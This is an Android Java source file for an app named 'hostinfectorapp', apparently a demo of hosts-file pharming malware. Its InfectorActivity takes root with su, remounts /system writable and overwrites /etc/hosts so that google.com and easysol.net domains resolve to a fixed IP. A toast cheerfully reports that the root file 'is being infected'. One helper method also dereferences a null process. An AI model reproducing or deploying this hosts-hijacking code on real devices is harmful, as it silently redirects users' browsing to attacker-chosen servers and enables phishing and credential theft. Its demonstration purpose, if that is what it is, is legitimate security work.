package net.easysol.hostinfectorapp;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.text.SpannableString;
import android.text.style.UnderlineSpan;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.util.Iterator;

public class InfectorActivity extends AppCompatActivity {

    private File hostFile;
    public TextView hostText;
    public TextView txt_malware;
    public EditText hostPath;
    public Button showHostButton;
    public ImageButton infectHostButton;

    private String host_path;
    private String lineToAddToHost;
    String injectInfectedFile;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_infector);

       /* FloatingActionButtonab = (FloatingActionButto fn) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });
        hostText = (TextView) findViewById(R.id.host_txt);
        */
       txt_malware = (TextView) findViewById(R.id.txt_malware);
        SpannableString content = new SpannableString("Malware");
        content.setSpan(new UnderlineSpan(), 0, content.length(), 0);
        txt_malware.setText(content);

        /*
        hostPath = (EditText) findViewById(R.id.host_path);
        showHostButton = (Button) findViewById(R.id.show_host_button);

        showHostButton.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {
                            readHost();
                            showHostOnTextField();
                        }
                    });
        */
        infectHostButton = (ImageButton) findViewById(R.id.infect_host_button);

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_infector, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    private void readHost(){
        /*
        host_path = hostPath.getText().toString();
        hostFile = new File(host_path);//"/etc/hosts");
        */
        host_path = "/etc/hosts";

    }

    private void showHostOnTextField(){
        StringBuilder text = new StringBuilder();
        try {
            BufferedReader br = new BufferedReader(new FileReader(hostFile));
            String line;

            while ((line = br.readLine()) != null) {
                text.append(line);
                text.append('\n');
            }
            br.close();
        }
        catch (IOException e) {
            e.getStackTrace();
        }
        hostText.setText(text);
    }

    public void clearHostView(View view){
        hostText.setText("");
    }

    public void infectHost(View view) {

        readHost();

        //lineToAddToHost = "www.google.com www.facebook.com";

        //FileOutputStream outputStream;
        if (host_path != null && !host_path.isEmpty()) {

            new AsyncTask<Void, Void, Void>() {

                @Override
                protected Void doInBackground(Void... arg0) {
                    try {
                        //try2
                        //mountWritePermissions();
                        //iinfect();
                        //try1
                        //resetDeviceHosts();
                        //try3
                        injectInfectedFile = String.format("echo '%s' > %s", new Object[]{"127.0.0.1  localhost\n" +
                                "::1  ip6-localhost\n" +
                                "104.16.113.208 http://demotfp.easysol.net\n" +
                                "104.16.113.208 demotfp.easysol.net\n" +
                                "104.16.113.208 https://demotfp.easysol.net\n" +
                                "104.16.113.208 google.com\n" +
                                "104.16.113.208 www.google.com\n" +
                                "104.16.113.208 https://www.easysol.net/\n" +
                                "104.16.113.208 www.easysol.net\n", host_path});
                        executeSimpleShellCommand(injectInfectedFile);
                    } catch (Exception e) {
                        e.printStackTrace();
                        showToastMessage("Couldn't edit host file content");
                    }
                    return null;
                }
            }.execute();
        }else{
            showToastMessage("No host path neither root had been detected");
        }
    }

    public void showToastMessage(final String msg) {

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(InfectorActivity.this, msg, Toast.LENGTH_LONG).show();
            }});
    }


     private  boolean executeSimpleShellCommand(String command) {

         String mountCommand = "mount -o rw,remount /system";
         Process suShell = null;
         try {
             suShell = Runtime.getRuntime().exec("su");
             DataOutputStream commandLine = new DataOutputStream(suShell.getOutputStream());

             commandLine.writeBytes(mountCommand + '\n');
             commandLine.flush();

             commandLine.writeBytes(command + '\n');
             commandLine.flush();
             commandLine.writeBytes("exit\n");
             commandLine.flush();
             showToastMessage("root file is being infected :) check on your browser google, http://demotfp.easysol.net or www.easysol.net");
             return suShell.waitFor() == 0;
         } catch (IOException e) {
             e.printStackTrace();
             showToastMessage("Couldn't modify host file");
             return false;
         } catch (InterruptedException e) {
             e.printStackTrace();
             return false;
         }
     }

    private  boolean executeABunchShellCommands(String ... commands){
        String mountCommand = "mount -o rw,remount /system\n";
        Process suShell = null;
        DataOutputStream commandLine = new DataOutputStream(suShell.getOutputStream());

        try {

            suShell = Runtime.getRuntime().exec("su");
            commandLine.writeBytes(mountCommand + '\n');
            commandLine.flush();

            for (int i = 0; i < commands.length; i++) {
                String command = commands[i];
                commandLine.writeBytes(command + '\n');
                commandLine.flush();
            }

            commandLine.writeBytes("exit\n");
            commandLine.flush();

            suShell.waitFor();


        } catch (IOException ioe) {
            ioe.printStackTrace();
            return false;
        } catch (InterruptedException ie) {
            ie.printStackTrace();
            return false;
        }

        return true;
    }
}

